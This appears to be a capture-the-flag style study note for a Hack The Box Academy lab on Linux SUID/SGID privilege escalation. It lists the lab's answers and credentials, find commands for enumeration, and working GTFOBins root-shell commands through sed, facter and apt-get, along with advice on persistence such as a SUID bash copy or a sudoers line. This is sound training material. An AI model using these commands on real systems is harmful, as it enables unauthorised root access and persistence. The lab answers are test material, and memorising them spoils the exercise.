# Section 8 — Special Permissions (SUID / SGID + GTFOBins)

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answers (verified live)

| Q | Answer |
|---|--------|
| Q1 — SUID not in section list | **`/usr/bin/facter`**  (also: `/bin/sed`, `/usr/bin/traceroute6.iputils`) |
| Q2 — SGID not in section list | **`/usr/bin/facter`** |

`/usr/bin/facter` = `-rwsr-sr-x` → **SUID *and* SGID** (the planted dual-bit binary); `/bin/sed` = `-rwsr-xr-x` (SUID-only extra).

---

## Concept

- **SUID** (`chmod 4xxx`, shows `s` in the *user* execute slot): the binary runs as its **owner** (usually root) regardless of who launches it.
- **SGID** (`chmod 2xxx`, `s` in the *group* execute slot): runs with the binary's **group**.
- Capital `S` = bit set but file not executable (no underlying `x`). Lowercase `s` = exploitable.
- Any SUID-root binary with a way to "run a command / read a file / write a file" → privilege escalation.

---

## Enumerate

```bash
# SUID (owned by root)
find / -user root -perm -4000 -type f 2>/dev/null
# SGID
find / -perm -2000 -type f 2>/dev/null
# both bits / "uid 0" variant the section mentions
find / -uid 0 -perm -6000 -type f 2>/dev/null
# long-listing to see the exact bits + spot the odd one
find / -perm -4000 -o -perm -2000 -type f -exec ls -ldb {} \; 2>/dev/null
```
> Method for "find one **not** in the reference list": run the `find`, then diff against the known-default set. The non-standard plant pops out — here `facter` (Puppet, not normally SUID/SGID) and `sed` (never SUID by default). Custom binaries in `/home/*` and weird `/usr/bin` entries (`facter`, `sed`, anything with `-rwsr-sr-x`) are the targets.

---

## Exploit — GTFOBins methodology

For any SUID/SGID (or `sudo`-allowed) binary, look it up on **gtfobins.github.io** under **SUID** / **Sudo**. Examples:

```bash
# the section's example (sudo apt-get):
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh        # -> root shell

# SUID sed (this box) -> read/own as root, or:
sed -e 'r /etc/shadow' /etc/hostname        # read root-only files
# (sed SUID can also clobber files; GTFOBins 'sed' SUID entry)

# SUID facter (this box, Puppet) -> runs custom Ruby "facts" as root:
mkdir -p /tmp/f && echo 'exec("/bin/bash -p")' > /tmp/f/x.rb     # custom fact
FACTERLIB=/tmp/f /usr/bin/facter            # facter loads + runs x.rb as root -> id=root

# generic SUID binary patterns (GTFOBins):
./suidbin -p              # many wrappers honour -p / drop a shell
cp /bin/bash /tmp/rb; chmod +s /tmp/rb   # if a SUID binary lets you write/chmod
```
> Workflow: enumerate → for each non-standard SUID/SGID, `gtfobins.github.io/#+suid` → run the documented payload. `facter` honours `FACTERLIB`/custom facts executed with the binary's (root) privileges → `/bin/bash -p` = root. Keep a durable foothold (SUID `/bin/bash` copy, sudoers line, SSH key).

> Build the candidate list once (from §3's `installed_pkgs.list`) and pre-filter against GTFOBins so you instantly recognise an exploitable SUID on sight.

---

## Exam / Engagement Notes

- **"SUID/SGID not in the section output"** → run `find / -perm -4000` / `-2000`, ignore the standard set (mount, su, sudo, passwd, pkexec, ping, chsh/chfn, ssh-keysign, snap-confine, …); the leftover is the answer. This box: **`/usr/bin/facter`** (dual `-rwsr-sr-x`), `/bin/sed`, `/usr/bin/traceroute6.iputils`.
- `-rwsr-sr-x` (s in BOTH user+group) answers a SUID *and* a SGID question with one binary.
- Capital `S` = not executable → usually not directly exploitable (note it, move on).
- Memorise high-value GTFOBins SUID: `bash, sed, awk, find, vim, less, more, nano, cp, tar, env, nmap(old), python, perl, ruby, gdb, facter, screen-4.5.0 (CVE-2017-5618)`.
- `screen-4.5.0` SUID (seen on these boxes) = CVE-2017-5618 local root — recognise it.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>
2. find / -user root -perm -4000 -type f 2>/dev/null     # SUID
   find / -perm -2000 -type f 2>/dev/null                # SGID
3. diff vs section list -> /usr/bin/facter (-rwsr-sr-x, both bits), /bin/sed (SUID)
4. Q1 = /usr/bin/facter   Q2 = /usr/bin/facter           ✅
   (exploit: FACTERLIB=/tmp/f facter  with a custom .rb -> root)
```

> One line: `find -perm -4000/-2000`, subtract the default set, the planted binary (`facter`, `-rwsr-sr-x`) is the answer — then GTFOBins it to root.
